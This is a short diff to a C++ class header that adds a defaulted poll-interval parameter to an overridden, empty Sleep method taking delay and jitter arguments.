@@ -89,7 +89,7 @@ public:
 	int   RecvSize() override;
 	void  RecvClear() override;
 
-	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override {}
+	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs = 0) override {}
 
 	static void* operator new(size_t sz);
 	static void operator delete(void* p) noexcept;
